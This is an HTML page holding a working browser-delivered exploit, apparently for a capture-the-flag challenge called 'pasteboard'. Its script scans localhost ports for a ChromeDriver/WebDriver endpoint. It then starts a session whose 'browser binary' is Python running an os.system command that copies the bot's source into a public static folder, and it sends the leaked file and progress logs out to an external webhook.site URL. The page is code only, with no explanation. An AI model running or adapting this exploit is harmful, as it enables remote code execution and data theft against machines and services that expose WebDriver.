<!doctype html>
<html>
<body>
<script>
(async () => {
  const webhook = "https://webhook.site/02ba1267-d374-404a-b6ba-140ecba448bb";
  const log = (msg) => fetch(webhook, { method: "POST", mode: "no-cors", body: msg }).catch(() => {});

  log("pasteboard exploit: start");

  async function findPort() {
    const ports = [];
    for (let p = 1024; p <= 65535; p++) ports.push(p);
    for (let i = ports.length - 1; i > 0; i--) {
      const j = (Math.random() * (i + 1)) | 0;
      [ports[i], ports[j]] = [ports[j], ports[i]];
    }
    const batch = 400;
    for (let i = 0; i < ports.length; i += batch) {
      const slice = ports.slice(i, i + batch);
      const probes = slice.map((p) => {
        const ctrl = new AbortController();
        setTimeout(() => ctrl.abort(), 300);
        const tries = [
          `http://127.0.0.1:${p}/status`,
          `http://127.0.0.1:${p}/wd/hub/status`,
          `http://[::1]:${p}/status`,
          `http://[::1]:${p}/wd/hub/status`,
        ];
        return tries
          .reduce(
            (pr, url) =>
              pr.catch(() => fetch(url, { mode: "no-cors", signal: ctrl.signal }).then(() => p)),
            Promise.reject()
          )
          .catch(() => null);
      });
      const res = await Promise.all(probes);
      const hit = res.find(Boolean);
      if (hit) return hit;
    }
    return null;
  }

  const port = await findPort();
  if (!port) {
    log("pasteboard exploit: no port found");
    return;
  }
  log("pasteboard exploit: found port " + port);

  const py = "__import__('os').system('echo " + port + " > /app/static/port.txt; cat /app/bot.py > /app/static/leak.txt')";
  const body = {
    capabilities: {
      alwaysMatch: {
        browserName: "chrome",
        "goog:chromeOptions": { binary: "/usr/local/bin/python", args: ["-c", py] },
      },
    },
  };

  fetch(`http://127.0.0.1:${port}/session`, {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify(body),
  }).catch(() => {});

  setTimeout(() => {
    fetch("/static/leak.txt")
      .then((r) => r.text())
      .then((t) => log("leak:\n" + t))
      .catch(() => {});
  }, 1200);
})();
</script>
</body>
</html>
